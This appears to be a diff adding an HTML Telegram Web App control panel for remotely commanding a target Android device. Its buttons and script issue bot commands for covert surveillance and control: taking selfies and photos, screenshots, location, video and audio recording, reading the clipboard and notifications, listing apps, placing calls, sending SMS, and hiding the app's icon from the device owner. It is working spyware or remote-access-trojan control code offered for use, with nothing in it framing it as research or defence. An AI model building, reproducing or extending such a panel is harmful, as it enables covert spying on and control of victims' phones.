@@ -1,1 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DetailsApp Control Center</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
 
+        :root {
+            --bg-color: #0B1120;
+            --surface-color: rgba(30, 41, 59, 0.7);
+            --border-color: rgba(255, 255, 255, 0.1);
+            --primary: #8B5CF6;
+            --secondary: #06B6D4;
+            --danger: #F43F5E;
+            --success: #10B981;
+            --text-main: #F8FAFC;
+            --text-muted: #94A3B8;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            margin: 0;
+            padding: 20px;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 0% 0%, rgba(139, 92, 246, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 100% 100%, rgba(6, 182, 212, 0.15) 0%, transparent 50%);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+            animation: fadeInDown 0.5s ease-out;
+        }
+
+        .header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            margin: 0;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .device-section {
+            width: 100%;
+            max-width: 400px;
+            background: var(--surface-color);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        .device-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .device-input:focus {
+            border-color: var(--primary);
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            width: 100%;
+            max-width: 400px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        .action-btn {
+            background: var(--surface-color);
+            backdrop-filter: blur(8px);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 16px 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-main);
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-btn:active {
+            transform: scale(0.95);
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .action-btn.danger { border-color: rgba(244, 63, 94, 0.4); }
+        .action-btn.success { border-color: rgba(16, 185, 129, 0.4); }
+
+        .action-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .action-label {
+            font-size: 12px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .custom-input-group {
+            display: flex;
+            gap: 8px;
+            width: 100%;
+        }
+
+        .custom-input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .btn-small {
+            background: var(--primary);
+            border: none;
+            border-radius: 10px;
+            padding: 0 16px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-small:active { opacity: 0.8; }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--success);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            opacity: 0;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+            z-index: 1000;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>DetailsApp Control</h1>
+        <p>Remote Device Management</p>
+    </div>
+
+    <!-- Device ID Input -->
+    <div class="device-section">
+        <label style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px; display: block;">TARGET DEVICE ID</label>
+        <input type="text" id="deviceId" class="device-input" placeholder="e.g., 23129RAA4G_146eec" value="23129RAA4G_146eec">
+    </div>
+
+    <!-- Command Buttons -->
+    <div class="dashboard-grid">
+        <div class="action-btn" onclick="sendCmd('selfie')">
+            <span class="action-icon">🤳</span>
+            <span class="action-label">Selfie</span>
+        </div>
+        <div class="action-btn" onclick="sendCmd('cam')">
+            <span class="action-icon">📷</span>
+            <span class="action-label">Camera</span>
+        </div>
+        <div class="action-btn" onclick="sendCmd('screenshot')">
+            <span class="action-icon">📱</span>
+            <span class="action-label">Screenshot</span>
+        </div>
+        <div class="action-btn" onclick="sendCmd('location')">
+            <span class="action-icon">📍</span>
+            <span class="action-label">Location</span>
+        </div>
+        <div class="action-btn" onclick="sendCmd('video 10')">
+            <span class="action-icon">🎥</span>
+            <span class="action-label">Video 10s</span>
+        </div>
+        <div class="action-btn" onclick="sendCmd('lock')">
+            <span class="action-icon">🔒</span>
+            <span class="action-label">Lock Device</span>
+        </div>
+        <div class="action-btn" onclick="sendCmd('clip')">
+            <span class="action-icon">📋</span>
+            <span class="action-label">Clipboard</span>
+        </div>
+        <div class="action-btn" onclick="sendCmd('notif')">
+            <span class="action-icon">🔔</span>
+            <span class="action-label">Notifs</span>
+        </div>
+        <div class="action-btn danger" onclick="sendCmd('hide_icon')">
+            <span class="action-icon">👻</span>
+            <span class="action-label">Hide Icon</span>
+        </div>
+        <div class="action-btn success" onclick="sendCmd('torch_on')">
+            <span class="action-icon">💡</span>
+            <span class="action-label">Torch ON</span>
+        </div>
+        <div class="action-btn" onclick="sendCmd('torch_off')">
+            <span class="action-icon">🔌</span>
+            <span class="action-label">Torch OFF</span>
+        </div>
+        <div class="action-btn" onclick="sendCmd('apps')">
+            <span class="action-icon">📦</span>
+            <span class="action-label">App List</span>
+        </div>
+    </div>
+
+    <!-- Custom Actions -->
+    <div class="device-section" style="margin-top: 20px;">
+        <label style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px; display: block;">AUDIO RECORDING</label>
+        <div class="custom-input-group">
+            <input type="number" id="audioSec" class="custom-input" placeholder="Seconds (e.g., 30)" value="30">
+            <button class="btn-small" onclick="sendCustomCmd('audio', 'audioSec')">Record</button>
+        </div>
+        
+        <label style="font-size: 12px; color: var(--text-muted); margin-top: 16px; margin-bottom: 8px; display: block;">MAKE CALL</label>
+        <div class="custom-input-group">
+            <input type="tel" id="phoneNum" class="custom-input" placeholder="+88017...">
+            <button class="btn-small" onclick="sendCustomCmd('call', 'phoneNum')">Call</button>
+        </div>
+
+        <label style="font-size: 12px; color: var(--text-muted); margin-top: 16px; margin-bottom: 8px; display: block;">SEND SMS</label>
+        <div class="custom-input-group">
+            <input type="tel" id="smsNum" class="custom-input" placeholder="+88017...">
+            <input type="text" id="smsText" class="custom-input" placeholder="Message">
+            <button class="btn-small" onclick="sendSms()">Send</button>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast">Command Sent!</div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand(); // ফুল স্ক্রিন করা
+        tg.setHeaderColor('#0B1120');
+        tg.setBackgroundColor('#0B1120');
+
+        function showToast(message, color = 'var(--success)') {
+            const toast = document.getElementById('toast');
+            toast.innerText = message;
+            toast.style.background = color;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 2500);
+            
+            tg.HapticFeedback.impactOccurred('medium');
+        }
+
+        function getDeviceId() {
+            const id = document.getElementById('deviceId').value.trim();
+            if (!id) {
+                showToast('Please enter a Device ID!', 'var(--danger)');
+                return null;
+            }
+            return id;
+        }
+
+        function sendCmd(action) {
+            const id = getDeviceId();
+            if (!id) return;
+            
+            const command = `/cmd ${id} ${action}`;
+            executeCommand(command, action);
+        }
+
+        function sendCustomCmd(action, inputId) {
+            const id = getDeviceId();
+            if (!id) return;
+            
+            const val = document.getElementById(inputId).value.trim();
+            if (!val) {
+                showToast('Please enter a value!', 'var(--danger)');
+                return;
+            }
+            
+            const command = `/cmd ${id} ${action} ${val}`;
+            executeCommand(command, action);
+        }
+
+        function sendSms() {
+            const id = getDeviceId();
+            if (!id) return;
+            
+            const num = document.getElementById('smsNum').value.trim();
+            const text = document.getElementById('smsText').value.trim();
+            
+            if (!num || !text) {
+                showToast('Please enter number and message!', 'var(--danger)');
+                return;
+            }
+            
+            const command = `/cmd ${id} sendsms ${num} ${text}`;
+            executeCommand(command, 'SMS');
+        }
+
+        function executeCommand(command, label) {
+            // কমান্ডটি ক্লিপবোর্ডে কপি করা
+            navigator.clipboard.writeText(command).then(() => {
+                showToast(`✅ ${label} command copied to clipboard!`);
+                
+                // টেলিগ্রামে ডেটা পাঠানো (বট সাইডে হ্যান্ডেল করার জন্য)
+                try {
+                    tg.sendData(JSON.stringify({ command: command }));
+                } catch (e) {
+                    console.log("WebApp data sending failed. (Bot might not be in inline mode)");
+                }
+            }).catch(err => {
+                showToast('Failed to copy command!', 'var(--danger)');
+            });
+        }
+    </script>
+</body>
+</html>
